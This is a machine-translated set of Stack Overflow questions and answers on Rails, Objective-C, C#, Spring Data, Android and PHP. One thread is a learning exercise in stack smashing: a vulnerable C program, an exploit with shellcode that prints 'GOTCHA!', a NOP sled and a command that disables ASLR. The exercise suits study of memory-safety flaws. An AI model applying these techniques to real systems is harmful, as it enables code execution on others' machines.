使用 users 表中的有效 user_id 更新表（假设您已经使用注册表单创建了一个用户。或者只使用 1，因为 Devise 似乎从 1 开始第一个用户 id）

```
mysql> UPDATE mytable SET user_id = ( SELECT id FROM users WHERE email = ‘mememe@me.com’ ); 
```

处理将 user_id 添加到表插入

在 data/loggedin 控制器 CREATE 操作中，更新参数对象中的 user_id 字段。

```
def create

params[:mytable][:user_id] = current_user.id

…

end 
```

通过传递 user_id 作为参数来处理选择/查询

在数据/登录模型中，将 user_id 传递到新的 my 查询范围，然后将该新范围与其他范围组合（确保将 user_id 传递到其他范围；还有其他方法可以做到这一点，但我喜欢范围）：

```
scope :my, -> (user_id) { where(“user_id = ?”, user_id) }

scope :mylovelyquery, -> (user_id) { my(user_id).where(:mylovelyselectioncriteria=>”A”).order(“mysortfield”)  } 
```

在 data/logged 控制器中，更改索引操作以获取 current_user.id 并将其传递给您创建的 ActiveRecord 范围。这一步很乏味，可以经常完成——查找任何控制器索引或任何执行 SELET 的控制器操作——需要 RLS！这也适用于 Ajax 调用。

```
def index

@user_id = current_user.id

@mytables = Mytable.my(@user_id).order(mylovelysortfield DESC”)

end 
```

**得到教训**

可能让我最头疼的一件事是在检索数据库之前忘记获取 current_user.id。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-19T01:18:10.983

如果您的用户 has_many 公寓，那么通常您可以在控制器中执行此操作：

```
def edit
  current_user.apartments.find(params[:id])
end 
```

这只会找到属于当前用户的公寓。

更新

看起来你没有 current_user 对象......所以：

```
def edit 
  @apartment = Apartment.find(params[:id])
  redirect_to root_path, error: "You do not have access for this apartment"
end 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-19T01:20:33.093

您可以`before_filter`在您想要在控制器中限制的任何操作上使用 a。这里有一些关于这个主题的阅读：http: [//guides.rubyonrails.org/action_controller_overview.html#filters](http://guides.rubyonrails.org/action_controller_overview.html#filters)

# xcode - UIWebView 缩放时的奇怪行为。Xcode 4.3

> ID：10220248
> 
> 赞同：0
> 
> 时间：2012-04-19T01:01:02.630
> 
> 标签：xcode, uiwebview, zooming

在我的浏览器应用程序中，我有一个 webview 并且一切正常，但是双击缩放或捏缩放它似乎屏幕缩放到该位置，屏幕的苍蝇然后重绘它的自我。它发生在一瞬间，但它非常分散注意力。在 Safari Mobile 中，缩放非常流畅。这是如何实现的？谢谢，

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-24T13:15:19.753

好的，所以在我的视图控制器中，我有一个滚动视图需要隐藏在一个动作上，所以在我的视图 controller.h 文件中，我在各个区域都有这个代码来启动动画：

```
[UIView beginAnimations:nil context:nil];
[UIView setAnimationDuration:0.25];
[UIView setAnimationDelay:0.0];
[UIView setAnimationCurve:UIViewAnimationCurveEaseOut]; 
```

在 webview 中，我根本没有提到 UIView 动画。我补充说：

```
[UIView beginAnimations:nil context:nil];
[UIView setAnimationDuration:0.0];
[UIView setAnimationDelay:0.0]; 
```

为了安全起见，进入了didbegin和didfinish，它似乎已经解决了问题。

# xml - 根据 XMLListCollection filterFunction 结果在 Flash Builder 中创建基于单个 XML 元素的列表

> ID：10220249
> 
> 赞同：1
> 
> 时间：2012-04-19T01:01:06.203
> 
> 标签：xml, actionscript-3, air, flash-builder, filterfunction

我正在使用 Flash Builder 4，并且我有一个名为 words.xml 的外部 XML 文件，其结构如下：

```
<wordList>
    <wordRecord>
        <word>duck</word>
        <syllables>1</syllables>
        <firstLetter>d</firstLetter>
        <!--other fields-->
    </wordRecord>
    <wordRecord>
        <word>machete</word>
        <syllables>3</syllables>
        <firstLetter>m</firstLetter>
        <!--other fields-->
    </wordRecord>
    <!--more wordRecords-->
</wordList> 
```

现在，请注意，这些不是确切的字段名称或内容，因为它们是我的客户专有的，这是我的客户的 XML 文件。但这是基本结构。我只需要显示列表中每个“wordRecord”中的“word”字段，这将通过拖放和其他好东西来启用。

Flash Builder MXML 文件的相关部分是：

```
<fx:Declarations>
    <fx:XML id="wordsXML" source="/xml/words.xml" />
<fx:Declarations>
<s:List id="resultsList">
    <s:dataProvider>
        <s:XMLListCollection id="xmlWords" source="{wordsXML..word}" />
    </s:dataProvider>
</s:List> 
```

到目前为止，一切都很好。列表在我的 Air 应用程序、滚动条和所有内容中显示得很好，当存在适当的属性时，拖放效果很好。

但是，我需要的是能够根据其他字段过滤列表，并仅显示结果中的单词。

出于目前的目的，让我们假设 XML 文件包含很多很多“wordRecord”元素，我需要创建一个 filterFunction 最终将只给我“firstLetter”是的“单词”，假设“m”。

我尝试根据我在网上找到的一些示例创建一个 filterFunction，但由于我的 XMLListCollection 只是字段，我无法让 filterFunction 与其他 XML 字段一起使用。我尝试更改 XMLListDeclaration 以将每个“wordRecord”元素作为 XMLList 给我，但后来我无法弄清楚如何让 s:List 仅显示来自 filterFunction 的结果的“word”。

有任何想法吗？提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-19T06:46:39.273

```
<s:List id="resultsList" labelField="word">
    <s:dataProvider>
        <s:XMLListCollection
                id="xmlWords"
                source="{wordsXML..wordRecord}"
                />
    </s:dataProvider>
</s:List> 
```

这样，您的过滤器功能就有了“wordRecord”对象；

# c# - 如何使用 Windows 窗体和 C# 将嵌入的音乐文件复制到路径

> ID：10220251
> 
> 赞同：3
> 
> 时间：2012-04-19T01:01:39.297
> 
> 标签：c#, winforms, copy

我在 Visual Studio 2010 上创建了一个新项目。它是一个 Windows 窗体，并使用 .NET Framework 4 Client Profile 完成。

我在上面放了一个嵌入的 WAV 声音文件。

我唯一想做的就是将它复制到某个路径，例如桌面。我怎样才能做到这一点？

我已经尝试过这些：

[如何从资源中复制文件？](https://stackoverflow.com/questions/7254166/how-to-copy-file-from-resources)

[从资源中读取文件并在 C# 中将其写入磁盘](https://stackoverflow.com/questions/3978276/read-a-file-from-a-resource-and-write-it-to-disk-in-c-sharp)

[将文件从程序集资源流写入磁盘](https://stackoverflow.com/questions/864140/write-file-from-assembly-resource-stream-to-disk)

然而，我总是面临着麻烦。例如：

如果我添加一个名为 Take Over Control.wav 的音频资源，它的名称会被添加`Take_Over_Control`。然后，我只需在我的主表单中添加一个按钮，上面写着“复制”。然后，该按钮的点击事件有：

```
private void ButtonCopyClick(object sender, EventArgs e)
{
    Stream resource = Assembly.GetExecutingAssembly().GetManifestResourceStream("Take_Over_Control");
    if (resource == null)
    {
        throw new ArgumentException();
    }
    Stream output = File.OpenWrite(Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory)+"\\Sound.wav");
    resource.CopyTo(output);
} 
```

问题是......无论我是否在该部分中放置`Take_Over_Control`or`Resources.Take_Over_Control`或`Properties.Resources.Take_Over_Control`等，`GetManifestResourceStream`我总是卡在`throw new ArgumentException();`，所以，这意味着它`resource`是`null`，并且它没有很好地分配`Stream resource = Assembly.GetExecutingAssembly().GetManifestResourceStream("Take_Over_Control");`在线。

我尝试过的其他方法也有问题。这里有什么问题？如何以正确的方式复制这个嵌入的音频文件！？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-19T01:18:21.017

首先，您确定您的 WAV 文件是“构建操作”属性下的嵌入式资源吗？如果是这样，看起来您的 WAV 文件路径可能是错误的。线...

```
Stream resource = Assembly.GetExecutingAssembly().GetManifestResourceStream("Take_Over_Control"); 
```

应该

```
Stream resource = Assembly.GetExecutingAssembly().GetManifestResourceStream("myProject.resources.Take_Over_Control.wav"); 
```

其中 myProject 是项目的名称，resources 是保存 WAV 文件的文件夹。因此，如果这是您的 wav 文件的路径，则上面的代码将适用...“c:\myProject\resources\Take_Over_Control.wav

希望有帮助

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-19T15:09:13.163

在寻找 Resources.Designer.cs 文件时，我看到了 ResourceManager.GetStream... 所以，我现在在点击事件中使用它：

```
Stream resource = Properties.Resources.ResourceManager.GetStream("Take_Over_Control");
if (resource == null)
{
    throw new ArgumentException();
}
Stream output = File.OpenWrite(Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory)+"\\Sound.wav"); 
```

它只是将 WAV 文件复制到桌面的正确工作。还有……现在我没有反思了！

需要注意的是，当 WAV 文件添加到 Visual Studio 2010 C# .NET Framework 4 客户端配置文件项目时，它不是另存为`byte[]`，而是另存为`UnmanagedMemoryStream`. 正因为如此，需要将其转换为`byte[]`或只是将其放入`Stream`via `ResourceManager`，并且，`ResourceManager`方式更短！

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-07T16:46:17.617

有时，此代码的资源为 null：

```
Stream resource = Properties.Resources.ResourceManager.GetStream("ResourceFileName"); 
```

但是我们可以使用此代码而不是受赠者将您的资源返回给流变量

```
Stream resource = Properties.Resources.ResourceManager.GetStream("ResourceFileName") 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-19T06:41:17.083

您不需要这样做：`Properties.Resources.ResourceManager.GetStream`

如果你在 VS.NET 中使用资源编辑器，只需将你的 wav 文件拖到那里。然后，您将生成一个 Resources 类。

从那里，您只需要将`Resources.MySound`流复制到`FileStream`

```
var path = "c:\\temp\\MySound.wav";
using (var fs = new FileStream("c:\\temp\\sound.wav", FileMode.Create))
{
   Resources.MySound.CopyTo(fs);
}
Process.Start(path); 
```

# microsoft-metro - 为什么 Metro 应用程序不支持 MFCreateMediaSession？

> ID：10220252
> 
> 赞同：2
> 
> 时间：2012-04-19T01:01:45.177
> 
> 标签：microsoft-metro, windows-runtime, ms-media-foundation

我正在学习 Media Foundation，并希望通过 Metro 应用程序使用它。不幸的是，Metro 应用程序不支持 MFCreateMediaSession。这是为什么？Metro 应用程序如何创建媒体会话来播放应用程序动态生成的 PCM 音频流？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-23T22:10:35.383

显然，Metro 应用程序不会以这种方式创建自己的媒体会话是设计使然。[微软的 James Dailey 在MSDN 论坛线程](http://social.msdn.microsoft.com/Forums/en-US/winappswithnativecode/thread/fa0000e2-9969-42d8-9a2e-aa5684689ade/)（我的附加标记）上提供的以下答案提供了一些见解：

> 这里有两个选择：
> 
> 1) 使用[WASAPI](http://msdn.microsoft.com/en-us/library/windows/desktop/dd371455%28v=vs.85%29.aspx)并将您合成的 PCM 音频直接泵送到音频管理器（首选）
> 
> 2) 创建一个可以插入[Media Foundation 媒体引擎的自定义源](http://msdn.microsoft.com/library/windows/apps/Hh447918)
> 
> 任何一种方法都会按预期工作。您将需要仔细审查每种方法并将它们与您的软件要求进行比较。对于大多数合成音频场景，建议使用[WASAPI](http://msdn.microsoft.com/en-us/library/windows/desktop/dd371455%28v=vs.85%29.aspx) 。

他后来澄清：

> Q. [WASAPI](http://msdn.microsoft.com/en-us/library/windows/desktop/dd371455%28v=vs.85%29.aspx)：我的理解中缺少一个关键部分——如何对访问音频设备所需的对象进行初始激活/实例化。当Metro 风格的应用程序不支持[IMMDevice](http://msdn.microsoft.com/en-us/library/dd371395.aspx)时，我什至如何获得音频设备的句柄？
> 
> A. 代码如下：

```
Platform::String^ id = Windows::Media::Devices::MediaDevice::GetDefaultAudioCaptureId(Windows::Media::Devices::AudioDeviceRole::Console);
Microsoft::WRL::ComPtr<IAudioClient> pAudioClient = NULL;  
ActivateAudioInterface( id->Data(), __uuidof( IAudioClient ), (void**)&pAudioClient ); 
```

> Q. [Media Foundation Media Engine](http://msdn.microsoft.com/library/windows/apps/Hh447918)：从研究[实时通信样本](http://code.msdn.microsoft.com/windowsapps/Simple-Communication-Sample-eac73290)来看，播放/录制的方法似乎如下——到目前为止我做对了吗？
> 
> *   回放：使用[Windows.Media.MediaExtensionManager](http://msdn.microsoft.com/en-us/library/windows/apps/windows.media.mediaextensionmanager.aspx)注册一个方案（在示例中为“stsp://”）处理程序，该处理程序在导航到具有此方案的 URL 时创建一个自定义源。
> *   录制：实现自定义接收器并使用[Windows.Media.Capture.MediaCapture.StartRecordToCustomSinkAsync](http://msdn.microsoft.com/en-us/library/windows/apps/hh700855.aspx)将媒体捕获到它。
> 
> A. 是的，这似乎是一种合理的方法。

# c# - 是否可以使 IEnumerable 实施 IComparable？

> ID：10220253
> 
> 赞同：2
> 
> 时间：2012-04-19T01:01:46.410
> 
> 标签：c#, ienumerable, icomparable

如题。

我们都知道，如果我们想让一个类具有可比性并用于排序，即DataGrid，我们将实现IComparable。

但是对于 IEnumerable 我该怎么做呢？

我有一个 IEnumerable 的集合，我们想将每个 IEnumerable 相互比较并进行排序。

所以说一个`List<IEnumerable<char>>`包含：

`IEnumerable<char> EnumableA`包含：“d”、“e”、“f”

`IEnumerable<char> EnumableB`包含：“d”、“e”、“c”

如果我们将集合绑定`List<IEnumerable<char>>`到 DataGrid，当我们按 acs 顺序对它们进行排序时，顺序将是`EnumableB`第一个，然后`EnumableA`是第二个。

我确实想到了解决方案，例如将其存储`EnumableA`到一个 implment 的对象中`IComparable`，但这将需要创建另一个对象集合，这将是昂贵的。

那么是否有可能或无论如何将一个`IComparable`接口和我的排序实现附加到它`IEnuerable<char>`以便它可以排序？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-19T01:17:59.300

查看这篇文章： [使用自己的 IComparer<T> 和 Linq OrderBy](https://stackoverflow.com/questions/985657/use-own-icomparert-with-linq-orderby)

通过传入您的 IComparable 使用 linq.order。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-19T01:18:57.707

很多可以用的地方`IComparable`也会接受`IComparer`。写一个可能更容易`IComparer<IEnumerable<char>`。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-19T01:09:14.917

做你想做的事情的方法是编写一个实现`IEnumerable<char>`和的新类`IComparable`。

我可能会实现`IList<char>`，并有一个常规`List<char>`作为后备列表，通过对后备列表的相同调用来实现所有 IList，并根据需要实现 IComparable。

当然，你可以换一种方式，使用`string`类。它同时实现`IComparable`and `IEnumerable<char>`，因此这可能适合您想要的。

# regex - Shell 脚本/sed 表达式以添加/回显名称中带有空格的扩展名

> ID：10220261
> 
> 赞同：0
> 
> 时间：2012-04-19T01:02:53.353
> 
> 标签：regex, shell, unix, sed

我正在尝试将此示例文件作为输入：

./chExt1.sh 'a b' 'mouse.ext'

并使用当前脚本获取“mouse.ab”作为输出。我遇到的错误是：

```
~/UnixCourse/scriptAsst> ./chExt1.sh 'a b' 'mouse.dat'
sed: -e expression #1, char 31: unterminated `s' command
a b

mouse.dat
mv: cannot stat `mouse.dat': No such file or directory 
```

我当前的脚本是：

```
#!/bin/csh                                                                      
set ext="$1"
set oldName="$2"
set newName=`echo "$oldName" | sed 's/\.[A-Za-z0-9][A-Za-z0-9]*$/'.$ext'/g'`
#set newName=`echo "$oldName" | sed 's/\.[A-Za-z0-9][A-Za-z0-9]*$/'.$ext'/g'`   
echo "$ext"
echo "$newName"
echo "$oldName"
mv "$oldName" "$newName" 
```

我缺少什么会使文件回显带有空格的扩展名？

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-19T01:13:24.323

你需要使用正则表达式吗？如果您只使用：

```
echo ${2%.*}.$1 
```

你得到相同的结果：

```
$sh script 'a b' 'test.dat'
test.a b 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-19T01:17:30.500

`.$ext`包含空间，所以它应该被封闭在`"..."`

```
set newName=`echo "$oldName" | sed 's/\.[A-Za-z0-9][A-Za-z0-9]*$/'".$ext"'/g'` 
```

# hibernate - 使用@Query和休眠更新spring数据jpa中的布尔值

> ID：10220262
> 
> 赞同：39
> 
> 时间：2012-04-19T01:02:54.740
> 
> 标签：hibernate, spring-data, spring-data-jpa

我已经配置并运行了 spring-data 和 hibernate。我可以使用 spring-data 保存记录，但由于某种原因，我无法运行将更新表中所有布尔字段的查询。

我试过这个：

```
@Query("update Content v set v.published = false where v.division = :division and v.section = :section")
void unPublishContent(@Param("division") String division, 
                         @Param("section") String section); 
```

我也试过这个：

```
 @Query("update Content v set v.published = 0 where v.division = :division and v.section = :section")
void unPublishContent(@Param("division") String division, 
                         @Param("section") String section); 
```

参数划分和部分正在实现，但表上没有变化。

ps 我也在使用mysql数据库。

* * *

## 回答 #1

> 赞同：115
> 
> 时间：2012-09-14T14:02:06.893

我正在使用 Spring 3.1 和 Spring JPA Data。我遇到了类似的问题。尝试在 1 个查询中更新多条记录时，我经常遇到错误。

所以，我有这样的事情。

```
@Query("UPDATE User u SET u.state = ?1 WHERE u.server.id = ?2")
public void updateAllUsers(long state, long serverid); 
```

错误：

```
org.hibernate.hql.QueryExecutionRequestException: Not supported for DML operations 
```

所以，谷歌搜索了一段时间后，我发现你必须添加@Modifying。

```
@Modifying  
@Query("UPDATE User u SET u.state = ?1 WHERE u.server.id = ?2")
public void updateAllUsers(long state, long serverid); 
```

但后来我收到以下错误：

```
...    
nested exception is org.springframework.dao.InvalidDataAccessApiUsageException: Executing an update/delete query; 
nested exception is javax.persistence.TransactionRequiredException: Executing an update/delete query
... 
```

所以，我认为我的问题现在是事务问题，我回到谷歌研究它，发现你现在必须添加@Transactional。看来@Modifying 也需要@Transactional。

```
@Modifying  
@Transactional
@Query("UPDATE User u SET u.state = ?1 WHERE u.server.id = ?2")
public void updateAllUsers(long state, long serverid); 
```

但后来我收到以下错误：

```
No value for key [org.apache.commons.dbcp.BasicDataSource (...) ] bound to thread 
```

我再次用谷歌搜索了一段时间，得出的结论是我的配置是错误的，结果证明是真的。我错过了一些 xml 配置。

```
<beans:bean class="org.springframework.orm.jpa.JpaTransactionManager" id="transactionManager">
    <beans:property name="entityManagerFactory" ref="entityManagerFactory"/>
</beans:bean>

<tx:annotation-driven transaction-manager="transactionManager"/> 
```

这是一段漫长的旅程，但我终于让它工作了。我希望这会帮助一些人，因为许多其他人通过他们精彩的博客、答案和评论帮助我，试图“向前支付”。

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2012-04-19T07:44:39.197

[要执行修改查询，您需要使用参考文档](http://static.springsource.org/spring-data/data-jpa/docs/current/reference/html/#jpa.modifying-queries)`@Modifying`中概述的附加注释方法，如下所示：

```
@Modifying
@Query("update Content v set v.published = false where v.division = :division and v.section = :section")
void unPublishContent(@Param("division") String division, 
                     @Param("section") String section); 
```

* * *

## 回答 #3

> 赞同：8
> 
> 时间：2015-05-27T00:54:36.897

对我来说，它也适用于以下注释：

```
@Modifying
@Query("update User u set u.active=1 where a.id=?1")
@Transactional
void  activeUser(Long id); 
```

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2013-09-22T16:42:49.177

对我来说，它使用以下注释：

```
@Modifying
@Query("update JsonContactImport x set x.isImported = true where x.id in :ids")
@Transactional
void updateImported(@Param("ids")  List<Long> ids); 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2019-04-10T20:28:43.723

使用 Spring 5，仍然需要 @Transactional 注释。

```
@Repository
public interface DoorStyleRepository extends JpaRepository<DoorStyle, Long> {

    @Modifying
    @Transactional
    @Query("UPDATE DoorStyle ds SET ds.enabled = false")
    void setEnabledFalse();
} 
```

# android - TableRow 上的备用背景颜色

> ID：10220265
> 
> 赞同：0
> 
> 时间：2012-04-19T01:03:34.440
> 
> 标签：android, tableview, tablerow

我有一个 TableView，它为它解析的 XML 文件中的每个条目添加一个 TableRow。

要设置背景颜色，我目前正在使用：

`TableRow.setBackgroundResource(color);`

如何设置它以便每个 TableRow 交替背景颜色？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-19T01:17:10.720

一个简单直接的解决方案可能是，当您遍历 XML 文件中的每个条目时，保留一个计数器。如果计数器是奇数，使用`color1`，如果计数器是偶数，使用`color2`。

```
for(int i = 0; i < NUM_XML_ENTRIES; i++){
  // add table row
  if (i % 2) {
    TableRow.setBackgroundResource(color1);
  } else {
    TableRow.setBackgroundResource(color2);
  }
} 
```

# c - C 溢出需要一些指导

> ID：10220267
> 
> 赞同：1
> 
> 时间：2012-04-19T01:03:52.663
> 
> 标签：c, security, buffer, buffer-overflow

我有 2 个程序正在尝试进行一些堆栈粉碎。

漏洞

```
#include <stdlib.h>
#include <stdio.h>
int bof()
{
    char buffer[8];
    FILE *badfile;
    badfile = fopen( "badfile", "r" );
    fread( buffer, sizeof( char ), 1024, badfile );
    return 1;
}

int main( int argc, char **argv)
{
    bof();
    printf("Not gonna do it! \n");
    return 1;
} 
```

漏洞利用.c

```
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

char shellcode[] =
 "\xeb\x16"
 "\x31\xdb"
 "\x31\xd2"
 "\x31\xc0"
 "\x59"
 "\xbb\x01\x00\x00\x00"
 "\xb2\x09"
 "\xb0\x04"
 "\xcd\x80"
 "\xb0\x01"
 "\xcd\x80"
 "xe8\xe5\xff\xff\xff"
 "GOTCHA!\n";

#define OFFSET 1500

    int bof()
    {
       char buffer[8];
       strcpy(buffer, "AAAAAAAAA");
       return 1;
    }

    unsigned long get_ESP(void)
    {
          __asm__("movl %ESP,%EAX");
    }

    int main(int argc, char **argv)
    {
      unsigned int addr;
      FILE *badfile;
      char buffer[1024];
      addr = get_ESP()+OFFSET;
      fprintf(stderr, "Using Offset: 0x%x\nShell code size: %lx\n",addr, sizeof(shellcode));
      memset(&buffer, 0x90, 1024);
      buffer[12] = addr & 0x000000ff;
      buffer[13] = (addr & 0x0000ff00) >> 8;
      buffer[14] = (addr & 0x00ff0000) >> 16;
      buffer[15] = (addr & 0xff000000) >> 24;
      memcpy( &buffer[ (sizeof(buffer) - sizeof(shellcode)) ], shellcode,sizeof(shellcode) );
      badfile = fopen("./badfile","w");
      fwrite(buffer,1024,1,badfile);
      fclose(badfile);

    } 
```

我用这些命令在我的 Macbook 上编译了这个，`gcc vuln.c -fno-stack-protector -o vuln`并且`gcc exploit.c -fno-stack-protector -o exploit`. 然后我运行 vuln，它运行良好，然后利用并获得以下输出：

```
Using Offset: 0x6acd6814
Shell code size: 28 
```

然后我用 破坏了文件`od -t x2 badfile`，所以它最终看起来像这样：

```
bash-3.2# cat badfile
????????????h?j?????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????1?1?1?Y??   ?̀?̀xe8????GOTCHA! 
```

我正在尝试获取 vuln 程序的漏洞利用，以便它打印 GOTCHA！我现在得到`Bus error: 10`. 谁能给我一个提示我哪里出错了？

****__ *_* __ *_* __ *_* __ *_* __ *_* __ *_* __ *_* __ *_* _***更新****_* __ *_* __ *_* _****

 **我用 BT5 尝试了同样的程序。用于`echo 0 > /proc/sys/kernel/randomize_va_space`禁用 ASLR。

我仍然无法弄清楚为什么这不起作用。我在 gdb 中运行时得到这个：

```
Program received signal SIGSEGV, Segmentation fault.
0x90909090 in ?? ()
(gdb) 
```

我是否正确地尝试了这个？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-19T01:15:59.350

我不确定 OSX 有什么样的保护——这可能会在 Linux 机器上更好地工作。

不管怎样，基本的想法看起来不错——你的易受攻击的程序打开一个大文件并将它转储到一个小数组中。问题似乎是您的文件创建。

当您获得 ESP 时，您将获得当前程序的堆栈指针。这与易受攻击的程序无关，除非堆栈在两者中的设置完全相同（事实并非如此）。

更好的方法是在 gdb 中执行易受攻击的程序，直到您点击 bof() 并查看堆栈指针。如果这是一致的，那么你就赢了。如果它是随机的（我猜是这样），那么你将需要使用你的 nop-sled 和希望。

在 32 位机器上，堆栈随机化并不过分，反复尝试利用该漏洞最终会成功攻击。

祝你好运！**

# objective-c - 如何使 NSWindowController 在 OSX Lion 中以全屏模式运行？

> ID：10220268
> 
> 赞同：2
> 
> 时间：2012-04-19T01:03:52.743
> 
> 标签：objective-c, cocoa

不成功，我已经广泛搜索了如何以编程方式使 NSWindowController 在 OSX Lion 中以全屏模式运行。

我什至买了“Sams 自学 Mac OS X Lion 应用程序开发”，因为第 21 章/小时应该教如何做到这一点。我看到一些评论说本书中的代码通常不能正常工作。我还是抓住了机会，呃！

这是上述章节示例的[链接。](http://books.google.com/books?id=Y4LbQI9CfsMC&pg=PT377&lpg=PT377&dq=Sams+Teach+yourself+Mac+OS+X+Lion+App+Development+fullscreen&source=bl&ots=dA58pSCxx_&sig=WTfeZa7p6xWtCNcWOb_Zj51cRNU&hl=en&sa=X&ei=jWKPT9b5JYSk8gSOncSkBA&ved=0CFUQ6AEwCA)

基本上，这只是一个测试程序，基于上面列出的第 21 小时：

```
#import <Cocoa/Cocoa.h>

@interface WeatherWindowController : NSWindowController

- (IBAction)toggleFullScreen:(id)sender;

@end 
```

我添加了一个 NSObject 并将 WeatherWindowController 分配给它。我有一个正确连接的按钮，因为它正在正确记录 NSLog 语句。

```
#import "WeatherWindowController.h"

@interface WeatherWindowController ()

@end

@implementation WeatherWindowController

- (id)initWithWindow:(NSWindow *)window
{
    self = [super initWithWindow:window];
    if (self) {
        // Initialization code here.
    }
    return self;
}

-(void) awakeFromNib{
    self.window.collectionBehavior = NSWindowCollectionBehaviorFullScreenPrimary;    
}

- (void)windowDidLoad
{
    [super windowDidLoad];
    // Implement this method to handle any initialization after your window controller's window    has been loaded from its nib file.
}

- (IBAction)toggleFullScreen:(id)sender {
    NSLog(@"before toggleFullScreen");
    [self.window toggleFullScreen:sender];
    NSLog(@"after toggleFullScreen");
}
@end 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-19T01:31:32.723

不需要在窗口控制器中实现此方法，因为它的窗口也将在响应者链中，因此当您选择添加到的“进入/退出全屏”菜单项时应该接收操作您的视图菜单并连接到 First Responder。

那么，假设您已经创建并配置了该菜单项，那么当您选择它时*会*发生什么？

# php - 如何使用 file_put_contents (PHP) 将变量写入文件

> ID：10220270
> 
> 赞同：1
> 
> 时间：2012-04-19T01:04:07.080
> 
> 标签：php

我正在创建一个发布系统，当作者点击提交时，我需要在同一目录中创建一个新文件（newpost.php）。该文件将包含帖子的内容以及标题、作者等。我有 $title、$content 等所有内容的变量。但我还需要添加 div 标签和其他东西。如何使用 fwrite 或 file_put_contents 做到这一点？现在，我正在使用 file_put_contents。所以在 newpost.php 文件中，它会自动添加`echo $content`，等等。但这不起作用，因为一旦我离开页面，变量就会被破坏。我需要它以纯文本格式保存。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-19T01:34:45.423

使用`serialize`and`file_put_contents`和一些数组操作：

```
// Gather data to be saved
$data = array(
    'author' => 'Briedis',
    'content' => 'Content text',
);

// Save to file
file_put_contents('data.txt', serialize($data));

// Read from file
$saved_raw_data = file_get_contents('data.txt');
$saved_data = unserialize($saved_raw_data);

echo "Author:" . $saved_data['author'] . " Contents:" . $saved_data['content']; 
```

# php - PHP - 类声明不能嵌套

> ID：10220271
> 
> 赞同：2
> 
> 时间：2012-04-19T01:04:16.947
> 
> 标签：php, cakephp, aes, nested-class

我在 cakephp 中有一个项目，当我调用供应商使用 AES 解密字符串时，出现错误：

```
Fatal error: Class declarations may not be nested in /var/www/html/myproject/cake/libs/log/file_log.php on line 30 
```

这是我的控制器中的代码：

```
App::import('vendor', 'aes', array('file' => 'AES/AES.php'));
$aes = new AesCtr();
$decrypted = $aes->decrypt($encrypted, "mykey", 128); 
```

这是供应商的一部分（一个名为 AES.php 的文件）：

```
class Aes {
//....Methods
}

class AesCtr extends Aes {

  public static function decrypt($ciphertext, $password, $nBits) {
  //....Method Logic
  }

  //....Other methods

} 
```

我已经阅读了这里给出的解释：[PHP Nested classes work... sort of？](https://stackoverflow.com/questions/2608432/php-nested-classes-work-sort-of) 但我在 PHP 方面没有太多经验，也无法通过他们展示的“hacky 方式”解决这个问题。

任何帮助表示赞赏。如果需要更多信息，请告诉我。

更新类 Aes 和 AesCtr（都在文件 AES.php 中）。

```
<?php
/* - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -  */
/*  AES implementation in PHP                                                                     */
/*    (c) Chris Veness 2005-2011 www.movable-type.co.uk/scripts                                   */
/*    Right of free use is granted for all commercial or non-commercial use providing this        */
/*    copyright notice is retainded. No warranty of any form is offered.                          */
/* - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -  */

class Aes {

  /**
   * AES Cipher function: encrypt 'input' with Rijndael algorithm
   *
   * @param input message as byte-array (16 bytes)
   * @param w     key schedule as 2D byte-array (Nr+1 x Nb bytes) - 
   *              generated from the cipher key by keyExpansion()
   * @return      ciphertext as byte-array (16 bytes)
   */
  public static function cipher($input, $w) {    // main cipher function [§5.1]
    $Nb = 4;                 // block size (in words): no of columns in state (fixed at 4 for AES)
    $Nr = count($w)/$Nb - 1; // no of rounds: 10/12/14 for 128/192/256-bit keys

    $state = array();  // initialise 4xNb byte-array 'state' with input [§3.4]
    for ($i=0; $i<4*$Nb; $i++) $state[$i%4][floor($i/4)] = $input[$i];

    $state = self::addRoundKey($state, $w, 0, $Nb);

    for ($round=1; $round<$Nr; $round++) {  // apply Nr rounds
      $state = self::subBytes($state, $Nb);
      $state = self::shiftRows($state, $Nb);
      $state = self::mixColumns($state, $Nb);
      $state = self::addRoundKey($state, $w, $round, $Nb);
    }

    $state = self::subBytes($state, $Nb);
    $state = self::shiftRows($state, $Nb);
    $state = self::addRoundKey($state, $w, $Nr, $Nb);

    $output = array(4*$Nb);  // convert state to 1-d array before returning [§3.4]
    for ($i=0; $i<4*$Nb; $i++) $output[$i] = $state[$i%4][floor($i/4)];
    return $output;
  }

  private static function addRoundKey($state, $w, $rnd, $Nb) {  // xor Round Key into state S [§5.1.4]
    for ($r=0; $r<4; $r++) {
